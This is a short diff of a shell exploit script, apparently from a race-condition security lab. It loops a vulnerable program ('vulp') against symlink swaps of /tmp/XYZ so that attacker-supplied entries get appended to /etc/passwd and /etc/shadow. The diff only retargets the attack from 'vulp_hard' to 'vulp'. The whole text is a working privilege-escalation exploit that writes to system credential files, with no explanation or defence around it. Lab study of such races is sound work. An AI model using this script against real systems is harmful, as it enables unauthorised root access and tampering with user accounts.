@@ -8,7 +8,7 @@ old=`ls -l /etc/passwd`
 new=`ls -l /etc/passwd`
 while [ "$old" = "$new" ]
 do
-    ./vulp_hard < passwd_append > /dev/null &
+    ./vulp < passwd_append > /dev/null &
     ln -sf /etc/passwd /tmp/XYZ; ln -sf /tmp/ZYX /tmp/XYZ
     new=`ls -l /etc/passwd`
 done
@@ -19,7 +19,7 @@ old=`ls -l /etc/shadow`
 new=`ls -l /etc/shadow`
 while [ "$old" = "$new" ]
 do
-    ./vulp_hard < shadow_append > /dev/null &
+    ./vulp < shadow_append > /dev/null &
     ln -sf /etc/shadow /tmp/XYZ; ln -sf /tmp/ZYX /tmp/XYZ
     new=`ls -l /etc/shadow`
 done
